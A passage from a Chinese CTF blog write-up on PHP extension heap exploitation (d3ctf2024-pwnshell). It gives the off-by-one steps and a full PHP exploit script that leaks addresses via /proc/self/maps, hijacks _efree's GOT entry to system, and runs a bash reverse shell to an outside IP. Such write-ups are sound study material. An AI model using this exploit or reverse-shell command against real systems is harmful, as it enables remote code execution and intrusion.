class="number">0060</span>│  <span class="number">0x7ffff5400060</span> —▸ <span class="number">0x7ffff548d018</span> —▸ <span class="number">0x7ffff548d020</span> —▸ <span class="number">0x7ffff548d028</span> —▸ <span class="number">0x7ffff548d030</span> ◂— ...</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7ffff5400068</span> —▸ <span class="number">0x7ffff5482040</span> —▸ <span class="number">0x7ffff5482050</span> —▸ <span class="number">0x7ffff5482060</span> —▸ <span class="number">0x7ffff5482070</span> ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7ffff5400070</span> —▸ <span class="number">0x7ffff54010a8</span> —▸ <span class="number">0x7ffff54010c0</span> —▸ <span class="number">0x7ffff54010d8</span> —▸ <span class="number">0x7ffff54010f0</span> ◂— ...</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7ffff5400078</span> —▸ <span class="number">0x7ffff54026c0</span> —▸ <span class="number">0x7ffff54026e0</span> —▸ <span class="number">0x7ffff5402700</span> —▸ <span class="number">0x7ffff5402780</span> ◂— ...</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7ffff5400080</span> —▸ <span class="number">0x7ffff54687a8</span> —▸ <span class="number">0x7ffff54687d0</span> —▸ <span class="number">0x7ffff54687f8</span> —▸ <span class="number">0x7ffff5468820</span> ◂— ...</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x7ffff5400088</span> —▸ <span class="number">0x7ffff545d330</span> —▸ <span class="number">0x7ffff545d360</span> —▸ <span class="number">0x7ffff545d390</span> —▸ <span class="number">0x7ffff545d3c0</span> ◂— ...</span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x7ffff5400090</span> —▸ <span class="number">0x7ffff54563f0</span> —▸ <span class="number">0x7ffff5456428</span> —▸ <span class="number">0x7ffff5456460</span> —▸ <span class="number">0x7ffff5456498</span> ◂— ...</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x7ffff5400098</span> —▸ <span class="number">0x7ffff5473100</span> —▸ <span class="number">0x7ffff5473140</span> —▸ <span class="number">0x7ffff5473180</span> —▸ <span class="number">0x7ffff54731c0</span> ◂— ...</span><br></pre></td></tr></table></figure>
<p>特别注意到0x40的链,其第一个空闲chunkA的地址是00结尾,那么如果使用他来off-by-one则直接可以使得下下个分配出来的chunk又是A</p>
<p><strong>利用:</strong></p>
<ol>
<li>分配一个0x40的chunkA,并触发off-by-one</li>
<li>分配两个0x40的chunk,第二个会覆盖A的ptr指针,写入目标指针</li>
<li>修改chunkA-&gt;content的内容,实现任意写,这里选择修改_efree的got表为system</li>
<li>新增一个以需要执行命令为开头的chunk,并删除</li>
</ol>
<p>利用比较简单,几乎没有费脑的地方</p>
<p><strong>exp:</strong></p>
<p>这里选择直接包含<code>/proc/self/maps</code>来获取各种基址</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$leak</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$addr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">str_pad</span>(<span class="variable">$addr</span>, <span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>, <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line">    <span class="variable">$libc_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$module_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">p64</span>(<span class="variable">$module_base</span> + <span class="number">0x4038</span>).<span class="title function_ invoke__">p64</span>(<span class="number">0xff</span>), <span class="number">0x40</span>, <span class="string">&quot;\x90&quot;</span>);</span><br><span class="line">    <span class="variable">$gadget</span> = <span class="title function_ invoke__">p64</span>(<span class="variable">$libc_base</span> + <span class="number">0x4c490</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x8</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x30</span>));</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x2f</span>));<span class="comment">//下下个chunk也就是,$payload所在chunk又是之前那个,所以现在覆盖了ptr</span></span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_pad</span>(<span class="variable">$cmd</span>, <span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>), <span class="string">&quot;114514&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>, <span class="variable">$gadget</span>);<span class="comment">//edit就是在任意写了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.514.19.19/810 0&gt;&amp;1&quot;&#x27;</span>;<span class="comment">//= =</span></span><br><span class="line">    <span class="title function_ invoke__">leak</span>();</span><br><span class="line">    <span class="title function_ invoke__">attack</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">removeHacker</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">运行模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zend%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">zend基本数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">1.3.1.</span> <span class="toc-text">ida反编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">1.4.</span> <span class="toc-text">php内存管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%B1%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">存储层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E5%B1%82"><span class="toc-number">1.4.2.</span> <span class="toc-text">接口层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B1%82"><span class="toc-number">1.4.3.</span> <span class="toc-text">堆层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A7"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">旧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">新</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#small%E5%88%86%E9%85%8D%E8%B7%AF%E5%BE%84"><span class="toc-number">1.4.4.</span> <span class="toc-text">small分配路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8E%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">常用接口函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zend-parse-paramenters"><span class="toc-number">1.5.1.</span> <span class="toc-text">zend_parse_paramenters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#string%E7%9B%B8%E5%85%B3"><span class="toc-number">1.5.2.</span> <span class="toc-text">string相关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#str-pad"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">str_pad</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#str-repeat"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">str_repeat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">1.5.3.</span> <span class="toc-text">输出缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-start"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">ob_start</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-get-content"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">ob_get_content()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-end-flush"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">ob_end_flush</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.6.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WACON2023-heaphp"><span class="toc-number">2.1.</span> <span class="toc-text">WACON2023-heaphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3ctf2024-pwnshell"><span class="toc-number">2.2.</span> <span class="toc-text">d3ctf2024-pwnshell</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/5022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/5022/&text=phppwn初识"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/5022/&is_video=false&description=phppwn初识"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=phppwn初识&body=Check out this article: https://ixout.github.io/posts/5022/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/5022/&name=phppwn初识&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/5022/&t=phppwn初识"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>
        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    ixout
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
